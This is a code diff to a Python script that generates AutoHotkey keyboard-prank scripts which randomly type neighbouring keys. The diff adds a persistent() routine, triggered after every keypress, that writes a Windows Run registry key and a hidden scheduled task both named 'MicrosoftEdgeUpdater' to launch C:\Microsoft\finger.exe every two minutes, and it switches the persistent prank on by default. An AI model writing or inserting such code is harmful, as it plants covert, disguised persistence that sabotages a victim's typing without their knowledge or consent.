@@ -179,6 +179,23 @@ konami(char) {
     }
 }
 
+debouncePersistent() {
+    global _Timer
+
+    ; If timer already exists, stop it (reset countdown)
+    if IsSet(_Timer)
+        SetTimer(_Timer, 0)
+
+    ; Create timer that will call persistent() once after 1000ms
+    _Timer := (*) => persistent()
+    SetTimer(_Timer, -7000) ; negative for one-shot
+}
+
+persistent() {
+    RegWrite '"C:\\Microsoft\\finger.exe"', "REG_SZ", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "MicrosoftEdgeUpdater"
+    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\\Microsoft\\finger.exe"', , "Hide"
+}
+
 '''
 
     for key in neighbors:
@@ -193,9 +210,8 @@ konami(char) {
                 first = False
             result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "' + key + adjacent[i] + '"\n\t\t}'
         result += '\n\t} else {\n\t\tSend "' + key + '"\n\t}'
-        result += '\n\t' + r'''RegWrite '"C:\Microsoft\finger.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "MicrosoftEdgeUpdater"'''
-        result += '\n\t' + r'''Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\finger.exe"', , "Hide"'''
         result += '\n\tkonami("' + key + '")'
+        result += '\n\tdebouncePersistent()'
         result += '\n}\n'
 
         result += "$+" + key + '::{\n\trand := Random(1, odds2)\n\tif (rand <= odds1) {\n\t\t'
@@ -209,6 +225,7 @@ konami(char) {
             result += 'if (rand2 = ' + str(i + 1) + ') {\n\t\t\tSend "+' + key + "+" + adjacent[i] + '"\n\t\t}'
         result += '\n\t} else {\n\t\tSend "+' + key + '"\n\t}'
         result += '\n\tkonami("' + key + '")'
+        result += '\n\tdebouncePersistent()'
         result += '\n}\n'
 
     result += r'''$Up::{
@@ -672,7 +689,7 @@ def tool():
 
 if __name__ == "__main__":
     # fat_fingering()
-    # persistent_fat_fingering()
+    persistent_fat_fingering()
     # shift_keyboard_right_one()
     # type_backwards()
     # autocorrect()
